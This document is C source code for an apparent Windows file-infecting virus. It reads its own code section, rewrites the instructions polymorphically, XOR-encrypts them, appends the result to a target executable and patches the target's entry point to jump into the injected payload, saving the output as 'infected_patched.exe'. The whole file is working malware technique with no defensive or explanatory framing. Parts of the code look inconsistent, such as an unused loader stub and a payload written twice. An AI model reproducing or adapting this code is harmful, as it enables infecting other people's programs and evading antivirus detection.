
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "engine.h"
#include "mutate.h"
#include "isa.h"

#define MAX_INST_SIZE 15
#define MAX_MUTATED 4
#define XOR_KEY 0x5A
#define MARKER 0xDEADC0DE

void xor_encrypt(uint8_t *data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; ++i)
        data[i] ^= key;
}

uint8_t *mutate_self_text(size_t *out_len) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    FILE *f = fopen(path, "rb");
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    rewind(f);

    uint8_t *exe_buf = malloc(file_size);
    fread(exe_buf, 1, file_size, f);
    fclose(f);

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)exe_buf;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(exe_buf + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);

    uint8_t *text = NULL;
    DWORD text_size = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            text = exe_buf + sections[i].PointerToRawData;
            text_size = sections[i].SizeOfRawData;
            break;
        }
    }

    if (!text) return NULL;

    uint8_t *mutated = malloc(text_size + 16);
    size_t in_off = 0, out_off = 0;

    while (in_off < text_size) {
        struct Instruction inst;
        int decoded = decode_instruction(&text[in_off], &inst);
        if (decoded <= 0) {
            mutated[out_off++] = text[in_off++];
            continue;
        }

        struct Instruction mutated_inst[MAX_MUTATED];
        int count = mutate_multi(&inst, mutated_inst, MAX_MUTATED);
        int written = 0;

        if (count > 0) {
            for (int i = 0; i < count; ++i) {
                uint8_t encoded[MAX_INST_SIZE] = {0};
                int len = encode_instruction(&mutated_inst[i], encoded);
                memcpy(mutated + out_off, encoded, len);
                out_off += len;
                written += len;
            }
            memset(mutated + out_off, 0x90, decoded - written);
            out_off += (decoded - written);
        } else {
            mutate_opcode(&inst);
            uint8_t encoded[MAX_INST_SIZE] = {0};
            int len = encode_instruction(&inst, encoded);
            memcpy(mutated + out_off, encoded, len);
            out_off += len;
        }
        in_off += decoded;
    }

    xor_encrypt(mutated, out_off, XOR_KEY);
    *out_len = out_off;
    free(exe_buf);
    return mutated;
}

void build_loader_stub(uint8_t *stub, DWORD original_entry) {
    /*
        Generates:
            push rax
            push rcx
            push rdx
            push r8
            push r9
            push r10
            push r11
            call decrypt_and_run_payload
            pop r11..rax
            jmp original_entry
    */
    int i = 0;
    stub[i++] = 0x50; // push rax
    stub[i++] = 0x51; // push rcx
    stub[i++] = 0x52; // push rdx
    stub[i++] = 0x41; stub[i++] = 0x50; // push r8
    stub[i++] = 0x41; stub[i++] = 0x51; // push r9
    stub[i++] = 0x41; stub[i++] = 0x52; // push r10
    stub[i++] = 0x41; stub[i++] = 0x53; // push r11

    // call rel32
    stub[i++] = 0xE8;
    *(int32_t *)(stub + i) = 32; // call next stub + 32
    i += 4;

    stub[i++] = 0x41; stub[i++] = 0x5B; // pop r11
    stub[i++] = 0x41; stub[i++] = 0x5A; // pop r10
    stub[i++] = 0x41; stub[i++] = 0x59; // pop r9
    stub[i++] = 0x41; stub[i++] = 0x58; // pop r8
    stub[i++] = 0x5A; // pop rdx
    stub[i++] = 0x59; // pop rcx
    stub[i++] = 0x58; // pop rax

    stub[i++] = 0xE9;
    *(int32_t *)(stub + i) = original_entry - (0x1000 + i + 4); // rel32 JMP
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <target.exe>\n", argv[0]);
        return 1;
    }

    FILE *f = fopen(argv[1], "rb");
    if (!f) {
        perror("fopen target");
        return 1;
    }

    fseek(f, 0, SEEK_END);
    long t_size = ftell(f);
    rewind(f);

    uint8_t *target = malloc(t_size + 4096);
    fread(target, 1, t_size, f);
    fclose(f);

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)target;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(target + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);

    uint8_t *text = NULL;
    DWORD text_offset = 0;
    DWORD text_rawsize = 0;
    DWORD text_va = 0;

    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            text = target + sections[i].PointerToRawData;
            text_offset = sections[i].PointerToRawData;
            text_rawsize = sections[i].SizeOfRawData;
            text_va = sections[i].VirtualAddress;
            break;
        }
    }

    if (!text) {
        fprintf(stderr, "[-] Target has no .text section\n");
        return 1;
    }

    size_t mutated_len = 0;
    uint8_t *mutated_payload = mutate_self_text(&mutated_len);
    if (!mutated_payload) {
        fprintf(stderr, "[-] Mutation failed\n");
        return 1;
    }

    DWORD payload_rva = text_va + text_rawsize + 8;
    DWORD original_ep = nt->OptionalHeader.AddressOfEntryPoint;

    // Inject payload + metadata
    uint32_t inject_offset = text_offset + text_rawsize;
    *(uint32_t *)(target + inject_offset) = MARKER;
    *(uint32_t *)(target + inject_offset + 4) = (uint32_t)mutated_len;
    memcpy(target + inject_offset + 8, mutated_payload, mutated_len);

    // Patch original entry point to jmp to payload
    DWORD rel_offset = payload_rva - (original_ep + 5);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD va = sections[i].VirtualAddress;
        DWORD vsz = sections[i].Misc.VirtualSize;
        if (original_ep >= va && original_ep < va + vsz) {
            DWORD patch_offset = sections[i].PointerToRawData + (original_ep - va);
            target[patch_offset] = 0xE9;
            *(int32_t *)(target + patch_offset + 1) = (int32_t)rel_offset;
            break;
        }
    }

    FILE *out = fopen("infected_patched.exe", "wb");
    if (!out) {
        perror("fopen infected_patched");
        return 1;
    }

    fwrite(target, 1, t_size, out);
    fwrite(mutated_payload, 1, mutated_len + 8, out);
    fclose(out);

    printf("[*] Infected + patched file written to infected_patched.exe\n");
    free(mutated_payload);
    free(target);
    return 0;
}
